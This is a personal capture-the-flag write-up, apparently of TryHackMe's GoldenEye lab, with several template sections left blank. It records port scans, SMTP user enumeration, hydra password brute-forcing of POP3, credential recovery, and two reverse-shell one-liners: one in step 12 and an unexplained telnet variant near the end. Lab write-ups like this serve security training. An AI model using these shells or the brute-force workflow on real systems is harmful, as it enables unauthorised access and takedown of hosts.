---
creation date: August 1st 2023
last modified date: August 1st 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - GoldenEye]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown
```

Enumerated open TCP ports:
```bash
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE SASL(PLAIN) CAPA PIPELINING UIDL USER TOP
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES CAPA PIPELINING STLS AUTH-RESP-CODE USER UIDL SASL(PLAIN) TOP
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80
### ffuf /
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.9/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/directory_search.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 150
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 281, Words: 21, Lines: 11, Duration: 182ms]
    * FUZZ: .hta

[Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 192ms]
    * FUZZ: .htaccess

[Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 182ms]
    * FUZZ: .htpasswd

[Status: 200, Size: 252, Words: 10, Lines: 12, Duration: 187ms]
    * FUZZ: index.html

[Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 187ms]
    * FUZZ: server-status

:: Progress: [208971/208971] :: Job [1/1] :: 254 req/sec :: Duration: [0:04:35] :: Errors: 0 ::
```


### /sev-home/
#### boris : InvincibleHack3r







---

# Exploitation
## Name of the technique


---

# Lateral Movement to user
## Local Enumeration


## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Steps
1. `export RHOST=10.10.10.10`
2. `nmap -p- --min-rate 10000 $RHOST`
3. `nmap -p25,80,55006,55007 -sCV $RHOST`
4. Navigate to `http://10.10.10.9/`
	1. You are greeted with an animated page that talks about a login directory at `/sev-home`
	2. Open the source code using F12 on chrome browsers
		1. Open `index.html`
			1. We see it just references a JavaScript nothing else of importance
		2. Open `terminal.js`
			1. We find a user named **Boris** with an encoded password listed below in loot:
				1. We can decode this password using CyberChef it is encoded with *HTML Entity*
					1. Decoded Password: **InvincibleHack3r**
5. Navigate to `http://10.10.10.9/sev-home/`
	1. Login with the found credentials in `terminal.js`
	2. We find text that contains lore and a hint about their pop3 email server being set to higher than normal ports but we already found them since we scanned all ports
	3. Open the source code again:
		1. Index.html here seems to contain just normal code except for a small indicator `<!--` which is the start of a comment block in HTML... So we scroll down and find the rest of it
			1. We find another user to add to our list **Natalya**
6. Next we turn our focus onto the pop email server.
	1. I started by verifying both usernames with the open Port 25
		1. `telnet $RHOST 25`
			1. `VRFY boris`
			2. `VRFY natalya`
			3. Both show up
	2. Add both of these into a file named `user.list` each name on a new line
	3. Lets start trying to crack these using hydra. I did test out the password we already have for user boris and found that it failed.
		1. `hydra -L user.list -P /usr/share/wordlists/fasttrack.txt $RHOST pop3 -s 55007 -t 64`
			1. Note I did try this with *rockyou.txt* for about 15mins as its usually a list that is used for CTF's
			2. Canceled that scan and tried another one I like to use as a second choice and this cracked both within a minute
			3. Passwords are listed below in LOOT
	4. Now that we have both of these creds lets get started on enumerating them starting with **boris**:
		1. We will start by running `STAT` this will show the total emails in this users account
		2. Then `LIST` will individually list these each out
		3. `RETR <EMAIL NUMBER>` for each of the emails
			1. Reading through the emails the first 1 is an email from root letting boris know that they trust them so won't scan any files they send...
			2. Email 2 is natalya laughing that they can break any or boris's codes
			3. Email 3 is from `alec@janus.boss` saying they are infiltrating the organization and their operative will be in place soon named *Xenia*
	5. Now move over to **natalya** in pop3 and see what she is up to:
		1. Contains two emails
			1. First is root saying to stop messing with boris and to be on the watch out for network breaches as a possible new syndicate *Janus*
			2. Second is another from root saying there is a new hire *Xenia* and wants natalya to get everything setup for them. They also provided the uses log in credentials in plaintext. It also says that boris already verified them so to just make the account
7. Next up the task on TryHackMe tells us that we need to add a DNS record to our hosts file.
8. Now navigate to the given directory for this new site `http://severnaya-station.com/gnocertdir`
	1. Use the credentials for xenia that we found in Natalya's email
		1. Once in we can explore around and find that the site is empty aside from 1 message to a user names **doak**
9. Take this new user back to pop3 and use hydra to crack it using the same wordlist we used before should take about 1 minute
	1. password found of **goat** for user **doak**
10. Use these new credentials to sign into pop3 and we will find 1 email that gives more lore and then gives creds for the training site that we signed into with **xenia** 
11. Back to the training site and sign in with the new creds found in Doak's email: **dr_doak** : **4England!**
	1. Again the site is pretty empty but we find an offline user in contacts of Admin with no messages
	2. Checking the private files we find `s3cret.txt`
	3. Download this file to our machine and read it we will find that it tells us they are 007 and have captured the admins creds but cant send them over this text file
		1. 007 then tells us about a funny image located at directory of `/dir007key/for-007.jpg`
			1. Download this with: `wget http://severnaya-station.com/dir007key/for-007.jpg`
				1. Once downloaded I tried [[stegseek]], [[binwalk]], [[exiftool]] got a hit with exiftool hidden in the `Image Description:` field `eFdpbnRlcjE5OTV4IQ==`
					1. Decoded from its Base64 format using CyberChef: `xWinter1995x!`
12. Use this new found users creds which are **admin** : **xWinter1995x!** on the training page. The tasks at this point tell us to take a look at the plugin `Aspell` we can use the search bar at the bottom to find it and it looks like this plug in executes code on the server so we can use this for a reverse shell
	1. `sh -i >& /dev/tcp/10.13.0.100/9001 0>&1`
	2. To get the shell to execute we can read that this plugin is call as a spell checker so lets go spell check something










---

# Trophy & Loot





### Users
Web Portal = `boris : InvincibleHack3r`
pop3 = `boris : secret1!`
pop3 = `natalya : bird`
Web Portal = `xenia : RCP90rulez!`
pop3 = `doak : goat`

### /index.html
```html
<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="index.css">
</head>

	<span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="terminal.js"></script>

</html>
```


### /terminal.js
```javascript
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];


//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//


var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```


### Boris password:
```
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```


### Hydra pop3
```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-01 23:02:21
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 444 login tries (l:2/p:222), ~7 tries per task
[DATA] attacking pop3://10.10.10.9:55007/
[55007][pop3] host: 10.10.10.9   login: boris   password: secret1!
[STATUS] 381.00 tries/min, 381 tries in 00:01h, 63 to do in 00:01h, 64 active
[55007][pop3] host: 10.10.10.9   login: natalya   password: bird
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-01 23:03:32
```


### pop3 boris
```
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```


### pop3 natalya
```
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```


### pop3 doak
```
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 97DC24549D
	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```


### s3cret.txt
```
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```



sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: August 1st 2023 (08:25 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
